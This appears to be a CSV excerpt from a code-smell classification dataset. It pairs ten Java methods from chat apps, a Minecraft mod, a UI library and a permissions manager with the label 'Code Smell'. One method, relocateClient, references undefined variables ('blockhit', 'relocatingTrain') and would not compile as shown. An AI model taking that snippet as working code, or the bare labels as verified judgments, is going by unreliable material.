text,label,text_label
"public void setChatInfo(ChatInfo chatInfo){
  mChatInfo=chatInfo;
  if (chatInfo != null) {
    DraftInfo draftInfo=chatInfo.getDraft();
    if (draftInfo != null && !TextUtils.isEmpty(draftInfo.getDraftText()) && mTextInput != null) {
      Gson gson=new Gson();
      HashMap draftJsonMap;
      String content=draftInfo.getDraftText();
      try {
        draftJsonMap=gson.fromJson(draftInfo.getDraftText(),HashMap.class);
        if (draftJsonMap != null) {
          content=(String)draftJsonMap.get(""content"");
          String draftStr=(String)draftJsonMap.get(""reply"");
          ReplyPreviewBean bean=gson.fromJson(draftStr,ReplyPreviewBean.class);
          if (bean != null) {
            showReplyPreview(bean);
          }
        }
      }
 catch (      JsonSyntaxException e) {
        TUIChatLog.e(TAG,"" getCustomJsonMap error "");
      }
      mTextInput.setText(content);
      mTextInput.setSelection(mTextInput.getText().length());
    }
  }
}
",1,Code Smell
"/** 
 * Add a new IntProperty in the Parallax object. App may override {@link #createProperty(String,int)}.
 * @param name Name of the property.
 * @return Newly created Property object.
 * @see #createProperty(String,int)
 */
public final PropertyT addProperty(String name){
  int newPropertyIndex=mProperties.size();
  PropertyT property=createProperty(name,newPropertyIndex);
  if (property instanceof IntProperty) {
    int size=mValues.length;
    if (size == newPropertyIndex) {
      int[] newValues=new int[size * 2];
      for (int i=0; i < size; i++) {
        newValues[i]=mValues[i];
      }
      mValues=newValues;
    }
    mValues[newPropertyIndex]=IntProperty.UNKNOWN_AFTER;
  }
 else   if (property instanceof FloatProperty) {
    int size=mFloatValues.length;
    if (size == newPropertyIndex) {
      float[] newValues=new float[size * 2];
      for (int i=0; i < size; i++) {
        newValues[i]=mFloatValues[i];
      }
      mFloatValues=newValues;
    }
    mFloatValues[newPropertyIndex]=FloatProperty.UNKNOWN_AFTER;
  }
 else {
    throw new IllegalArgumentException(""Invalid Property type"");
  }
  mProperties.add(property);
  return property;
}",1,Code Smell
"/** 
 * Verify whether the currently logged in user has permission to operate on the current content
 * @param createUserId The creator of the current content
 */
public static void checkOperationPermission(Long createUserId){
  LoginUser loginUser=ContextUtils.getLoginUser();
  if (RoleCodeEnum.DESKTOP.getDefaultUserId().equals(loginUser.getId())) {
    if (RoleCodeEnum.DESKTOP.getDefaultUserId().equals(createUserId)) {
      return;
    }
 else {
      throw new PermissionDeniedBusinessException();
    }
  }
  if (loginUser.getAdmin()) {
    return;
  }
  if (!loginUser.getId().equals(createUserId)) {
    throw new PermissionDeniedBusinessException();
  }
}
",1,Code Smell
"@Override public boolean action(Request request,Response response){
  if (request.getNettyRequest() instanceof FullHttpRequest) {
    InputGetUserInfo inputUserId=getRequestBody(request.getNettyRequest(),InputGetUserInfo.class);
    if (inputUserId != null && (!StringUtil.isNullOrEmpty(inputUserId.getUserId()) || !StringUtil.isNullOrEmpty(inputUserId.getName()) || !StringUtil.isNullOrEmpty(inputUserId.getMobile()))) {
      WFCMessage.User user=null;
      if (!StringUtil.isNullOrEmpty(inputUserId.getUserId())) {
        user=messagesStore.getUserInfo(inputUserId.getUserId());
      }
 else       if (!StringUtil.isNullOrEmpty(inputUserId.getName())) {
        user=messagesStore.getUserInfoByName(inputUserId.getName());
      }
 else       if (!StringUtil.isNullOrEmpty(inputUserId.getMobile())) {
        user=messagesStore.getUserInfoByMobile(inputUserId.getMobile());
      }
      RestResult result;
      if (user == null || StringUtil.isNullOrEmpty(user.getName()) || user.getDeleted() > 0) {
        result=RestResult.resultOf(ErrorCode.ERROR_CODE_NOT_EXIST);
      }
 else {
        if (channelInfo.getOwner().equals(inputUserId.getUserId()) || messagesStore.checkUserInChannel(user.getUid(),channelInfo.getTargetId())) {
          if ((channelInfo.getStatus() & ProtoConstants.ChannelState.Channel_State_Mask_FullInfo) > 0) {
            result=RestResult.ok(InputOutputUserInfo.fromPbUser(user));
          }
 else {
            WFCMessage.User outUser=WFCMessage.User.newBuilder().setUid(user.getUid()).setName(user.getName()).setPortrait(user.getPortrait()).setDisplayName(user.getDisplayName()).build();
            result=RestResult.ok(InputOutputUserInfo.fromPbUser(outUser));
          }
        }
 else {
          if ((channelInfo.getStatus() & ProtoConstants.ChannelState.Channel_State_Mask_Unsubscribed_User_Access) > 0) {
            WFCMessage.User outUser=WFCMessage.User.newBuilder().setUid(user.getUid()).setName(user.getName()).setPortrait(user.getPortrait()).setDisplayName(user.getDisplayName()).build();
            result=RestResult.ok(InputOutputUserInfo.fromPbUser(outUser));
          }
 else {
            result=RestResult.resultOf(ErrorCode.ERROR_CODE_NOT_RIGHT);
          }
        }
      }
      setResponseContent(result,response);
    }
 else {
      setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
    }
  }
  return true;
}",1,Code Smell
"public void setChatEventListener(){
  if (chatPresenter instanceof C2CChatPresenter) {
    c2CChatEventListener=new C2CChatEventListener(){
      @Override public void onRecvMessageModified(      TUIMessageBean changedMessage){
        if (changedMessage != null && messageBean != null && TextUtils.equals(messageBean.getId(),changedMessage.getId())) {
          messageBean.setMessageRepliesBean(changedMessage.getMessageRepliesBean());
          onMessageModified(messageBean);
        }
      }
      @Override public void onMessageChanged(      TUIMessageBean messageBean,      int dataChangeType){
        onRecvMessageModified(messageBean);
      }
    }
;
    TUIChatService.getInstance().addC2CChatEventListener(c2CChatEventListener);
  }
 else {
    groupChatEventListener=new GroupChatEventListener(){
      @Override public void onRecvMessageModified(      TUIMessageBean changedMessage){
        if (changedMessage != null && messageBean != null && TextUtils.equals(messageBean.getId(),changedMessage.getId())) {
          messageBean.setMessageRepliesBean(changedMessage.getMessageRepliesBean());
          onMessageModified(messageBean);
        }
      }
      @Override public void onMessageChanged(      TUIMessageBean messageBean,      int dataChangeType){
        onRecvMessageModified(messageBean);
      }
    }
;
    TUIChatService.getInstance().addGroupChatEventListener(groupChatEventListener);
  }
}",1,Code Smell
"@Nullable @OnlyIn(Dist.CLIENT) public static Boolean relocateClient(Train relocating,boolean simulate){
  Minecraft mc=Minecraft.getInstance();
  HitResult hitResult=mc.hitResult;
  if (!(hitResult instanceof BlockHitResult))   return null;
  BlockPos blockPos=blockhit.getBlockPos();
  BezierTrackPointLocation hoveredBezier=null;
  boolean upsideDown=relocating.carriages.get(0).leadingBogey().isUpsideDown();
  Vec3 offset=upsideDown ? new Vec3(0,-0.5,0) : Vec3.ZERO;
  if (simulate && toVisualise != null && lastHoveredResult != null) {
    for (int i=0; i < toVisualise.size() - 1; i++) {
      Vec3 vec1=toVisualise.get(i).add(offset);
      Vec3 vec2=toVisualise.get(i + 1).add(offset);
      CreateClient.OUTLINER.showLine(Pair.of(relocating,i),vec1.add(0,-.925f,0),vec2.add(0,-.925f,0)).colored(lastHoveredResult || i != toVisualise.size() - 2 ? 0x95CD41 : 0xEA5C2B).disableLineNormals().lineWidth(i % 2 == 1 ? 1 / 6f : 1 / 4f);
    }
  }
  BezierPointSelection bezierSelection=TrackBlockOutline.result;
  if (bezierSelection != null) {
    blockPos=bezierSelection.blockEntity().getBlockPos();
    hoveredBezier=bezierSelection.loc();
  }
  if (simulate) {
    if (lastHoveredPos != null && lastHoveredPos.equals(blockPos) && Objects.equals(lastHoveredBezierSegment,hoveredBezier))     return lastHoveredResult;
    lastHoveredPos=blockPos;
    lastHoveredBezierSegment=hoveredBezier;
    toVisualise=null;
  }
  BlockState blockState=mc.level.getBlockState(blockPos);
  if (!(blockState.getBlock() instanceof ITrackBlock))   return lastHoveredResult=null;
  Vec3 lookAngle=mc.player.getLookAngle();
  boolean direction=bezierSelection != null && lookAngle.dot(bezierSelection.direction()) < 0;
  boolean result=relocate(relocating,mc.level,blockPos,hoveredBezier,direction,lookAngle,true);
  if (!simulate && result) {
    relocating.carriages.forEach(c -> c.forEachPresentEntity(e -> e.nonDamageTicks=10));
    AllPackets.getChannel().sendToServer(new TrainRelocationPacket(relocatingTrain,blockPos,hoveredBezier,direction,lookAngle,relocatingEntityId));
  }
  return lastHoveredResult=result;
}",1,Code Smell
"protected void paintArrow(Graphics2D g){
  int x=0;
  if (isRoundBorderAutoXOffset()) {
    Container parent=getParent();
    boolean vert=(direction == NORTH || direction == SOUTH);
    if (vert && parent instanceof JComponent && FlatUIUtils.hasRoundBorder((JComponent)parent))     x-=scale(parent.getComponentOrientation().isLeftToRight() ? 1 : -1);
  }
  FlatUIUtils.paintArrow(g,x,0,getWidth(),getHeight(),getDirection(),chevron,getArrowWidth(),getArrowThickness(),getXOffset(),getYOffset());
}",1,Code Smell
"private void processLoadedDiceStickers(String name,boolean isEmoji,TLRPC.TL_messages_stickerSet res,boolean cache,int date){
  AndroidUtilities.runOnUIThread(() -> loadingDiceStickerSets.remove(name));
  Utilities.stageQueue.postRunnable(() -> {
    if (cache && (res == null || Math.abs(System.currentTimeMillis() / 1000 - date) >= 60 * 60 * 24)) {
      AndroidUtilities.runOnUIThread(() -> loadStickersByEmojiOrName(name,isEmoji,false),res == null && !cache ? 1000 : 0);
      if (res == null) {
        return;
      }
    }
    if (res != null) {
      if (!cache) {
        putDiceStickersToCache(name,res,date);
      }
      AndroidUtilities.runOnUIThread(() -> {
        diceStickerSetsByEmoji.put(name,res);
        diceEmojiStickerSetsById.put(res.set.id,name);
        getNotificationCenter().postNotificationName(NotificationCenter.diceStickersDidLoad,name);
      }
);
    }
 else     if (!cache) {
      putDiceStickersToCache(name,null,date);
    }
  }
);
}",1,Code Smell
"public Vec3 getPosition(@Nullable TrackGraph trackGraph,double t){
  if (isTurn())   return turn.getPosition(Mth.clamp(t,0,1));
  if (trackGraph != null && (node1.location.yOffsetPixels != 0 || node2.location.yOffsetPixels != 0)) {
    Vec3 positionSmoothed=getPositionSmoothed(trackGraph,t);
    if (positionSmoothed != null)     return positionSmoothed;
  }
  return VecHelper.lerp((float)t,node1.location.getLocation(),node2.location.getLocation());
}",1,Code Smell
"@RequiresPermission(allOf={""android.permission.MANAGE_APP_OPS_MODES"",ManifestCompat.permission.GRANT_RUNTIME_PERMISSIONS,ManifestCompat.permission.REVOKE_RUNTIME_PERMISSIONS}) @WorkerThread private static void persistChanges(@NonNull ApplicationInfo applicationInfo,@NonNull Permission permission,@NonNull AppOpsManagerCompat appOpsManager,boolean mayKillBecauseOfAppOpsChange,@Nullable String revokeReason) throws PermissionException, RemoteException {
  int uid=applicationInfo.uid;
  int userId=UserHandleHidden.getUserId(uid);
  boolean shouldKillApp=false;
  if (!permission.isReadOnly()) {
    if (permission.isGranted()) {
      PermissionCompat.grantPermission(applicationInfo.packageName,permission.getName(),userId);
      Log.d(""PERM"",""Granted %s"",permission.getName());
    }
 else {
      boolean isCurrentlyGranted=PermissionCompat.checkPermission(permission.getName(),applicationInfo.packageName,userId) == PERMISSION_GRANTED;
      if (isCurrentlyGranted) {
        if (revokeReason == null) {
          PermissionCompat.revokePermission(applicationInfo.packageName,permission.getName(),userId);
        }
 else {
          PermissionCompat.revokePermission(applicationInfo.packageName,permission.getName(),userId,revokeReason);
        }
        Log.d(""PERM"",""Revoked %s"",permission.getName());
      }
    }
  }
  if (!permission.readOnly) {
    updateFlags(applicationInfo,permission,userId);
  }
  if (permission.affectsAppOp()) {
    if (!permission.isSystemFixed()) {
      if (permission.isAppOpAllowed()) {
        boolean wasChanged=allowAppOp(appOpsManager,permission.getAppOp(),applicationInfo.packageName,uid);
        shouldKillApp=wasChanged && !supportsRuntimePermissions(applicationInfo);
      }
 else {
        shouldKillApp=disallowAppOp(appOpsManager,permission.getAppOp(),applicationInfo.packageName,uid);
      }
    }
  }
  if (mayKillBecauseOfAppOpsChange && shouldKillApp && SelfPermissions.canKillUid()) {
    ActivityManagerCompat.killUid(uid,KILL_REASON_APP_OP_CHANGE);
  }
  if (userId != UserHandleHidden.myUserId()) {
    BroadcastUtils.sendPackageAltered(ContextUtils.getContext(),new String[]{applicationInfo.packageName});
  }
}
",1,Code Smell
